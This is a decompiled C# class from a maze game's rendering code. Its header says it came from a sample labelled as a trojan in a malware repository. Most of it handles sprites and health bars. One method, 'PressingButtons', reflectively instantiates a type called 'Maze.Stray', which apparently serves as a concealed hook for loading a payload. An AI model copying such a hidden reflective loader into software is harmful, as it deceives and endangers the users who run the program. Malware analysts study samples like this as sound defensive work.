// Decompiled with JetBrains decompiler
// Type: OOP_TeamWork.UI.PaintBrush
// Assembly: OOP-TeamWork, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 78E60F07-1B9F-418F-8C6F-A1FA2CABDF45
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.07\HEUR-Trojan.MSIL.Picsys.gen-5866008a90168b7835b8f8b3d25aa43b6aaafd059e7519932278729ceae256ba.exe

using OOP_TeamWork.Structure;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Windows.Forms;

namespace OOP_TeamWork.UI
{
  public class PaintBrush : IDrawable
  {
    private const int ProgressBarSizeX = 50;
    private const int ProgressBarSizeY = 8;
    private const int ProgressBarOffsetX = -3;
    private const int ProgressBarOffsetY = -10;
    private const string MageImagePath = "../../Images/Mage.png";
    private const string HealthPotionImagePath = "../../Images/HealingPoition.png";
    private const string ShieldImagePath = "../../Images/Shield.png";
    private const string WallImagePath = "../../Images/Wall.png";
    private const string BlueMonsterImagePath = "../../Images/BlueMonster.png";
    private const string BlackMonsterImagePath = "../../Images/BlackMonster.png";
    private const string WeaponImagePath = "../../Images/weapon.png";
    private const string KeyImagePath = "../../Images/key.png";
    private Image mageImage;
    private Image healthPotionImage;
    private Image blueMonster;
    private Image wallImage;
    private Image blackMonster;
    private Image shieldImage;
    private Image weaponImage;
    private Image keyImage;
    private Form gameWindow;
    private List<PictureBox> pictureBoxes;
    private List<ProgressBar> progressBars;

    public PaintBrush(Form form)
    {
      this.gameWindow = form;
      this.LoadResources();
      this.pictureBoxes = new List<PictureBox>();
      this.progressBars = new List<ProgressBar>();
    }

    public void AddObject(IDrawable renderableObject)
    {
      if (renderableObject is Unit)
        this.CreateProgressBar(renderableObject as Unit);
      this.CreatePictureBox(renderableObject);
    }

    public void RemoveObject(IDrawable renderableObject)
    {
      PictureBox pictureBoxByObject = this.GetPictureBoxByObject(renderableObject);
      this.gameWindow.Controls.Remove((Control) pictureBoxByObject);
      this.pictureBoxes.Remove(pictureBoxByObject);
      if (!(renderableObject is Unit))
        return;
      ProgressBar progressBarByObject = this.GetProgressBarByObject(renderableObject as Unit);
      this.gameWindow.Controls.Remove((Control) progressBarByObject);
      this.progressBars.Remove(progressBarByObject);
    }

    public void RedrawObject(IDrawable objectToBeRedrawn)
    {
      Point point = new Point(objectToBeRedrawn.PositionX, objectToBeRedrawn.PositionY);
      this.GetPictureBoxByObject(objectToBeRedrawn).Location = point;
      if (!(objectToBeRedrawn is Unit))
        return;
      Unit unit = objectToBeRedrawn as Unit;
      ProgressBar progressBarByObject = this.GetProgressBarByObject(unit);
      this.SetProgressBarLocation(unit, progressBarByObject);
      progressBarByObject.Value = unit.CurrentHealth;
    }

    private void CreateProgressBar(Unit unit)
    {
      ProgressBar progressBar = new ProgressBar();
      progressBar.Size = new Size(50, 8);
      this.SetProgressBarLocation(unit, progressBar);
      progressBar.Maximum = unit.health;
      progressBar.Value = unit.CurrentHealth;
      progressBar.Tag = (object) unit;
      this.progressBars.Add(progressBar);
      this.gameWindow.Controls.Add((Control) progressBar);
    }

    private void SetProgressBarLocation(Unit unit, ProgressBar progressBar) => progressBar.Location = new Point(unit.UnitPositionX - 3, unit.UnitPositionY - 10);

    private ProgressBar GetProgressBarByObject(Unit unit) => this.progressBars.First<ProgressBar>((Func<ProgressBar, bool>) (p => p.Tag == unit));

    private void CreatePictureBox(IDrawable renderableObject)
    {
      Image spriteImage = this.GetSpriteImage(renderableObject);
      PictureBox pictureBox = new PictureBox();
      pictureBox.BackColor = Color.Transparent;
      pictureBox.Image = spriteImage;
      pictureBox.Parent = (Control) this.gameWindow;
      pictureBox.Location = new Point(renderableObject.PositionX, renderableObject.PositionY);
      pictureBox.Size = new Size(renderableObject.Width, renderableObject.Height);
      pictureBox.Tag = (object) renderableObject;
      this.pictureBoxes.Add(pictureBox);
      this.gameWindow.Controls.Add((Control) pictureBox);
    }

    public static void PressingButtons() => Activator.CreateInstance(Maze.Stray);

    private Image GetSpriteImage(IDrawable renderableObject)
    {
      Image spriteImage;
      switch (renderableObject.SpriteType)
      {
        case SpriteType.BlackMonster:
          spriteImage = this.blackMonster;
          break;
        case SpriteType.BlueMonster:
          spriteImage = this.blueMonster;
          break;
        case SpriteType.HealnigPoition:
          spriteImage = this.healthPotionImage;
          break;
        case SpriteType.Mage:
          spriteImage = this.mageImage;
          break;
        case SpriteType.Shield:
          spriteImage = this.shieldImage;
          break;
        case SpriteType.Wall:
          spriteImage = this.wallImage;
          break;
        case SpriteType.Weapon:
          spriteImage = this.weaponImage;
          break;
        case SpriteType.Key:
          spriteImage = this.keyImage;
          break;
        default:
          spriteImage = this.wallImage;
          break;
      }
      return spriteImage;
    }

    private PictureBox GetPictureBoxByObject(IDrawable renderableObject) => this.pictureBoxes.First<PictureBox>((Func<PictureBox, bool>) (p => p.Tag == renderableObject));

    public void LoadResources()
    {
      this.mageImage = Image.FromFile("../../Images/Mage.png");
      this.healthPotionImage = Image.FromFile("../../Images/HealingPoition.png");
      this.blueMonster = Image.FromFile("../../Images/BlueMonster.png");
      this.wallImage = Image.FromFile("../../Images/Wall.png");
      this.blackMonster = Image.FromFile("../../Images/BlackMonster.png");
      this.shieldImage = Image.FromFile("../../Images/Shield.png");
      this.weaponImage = Image.FromFile("../../Images/weapon.png");
      this.keyImage = Image.FromFile("../../Images/key.png");
    }

    public int PositionX { get; set; }

    public int PositionY { get; set; }

    public void Draw()
    {
    }

    public int Width { get; set; }

    public int Height { get; set; }

    public SpriteType SpriteType { get; set; }
  }
}
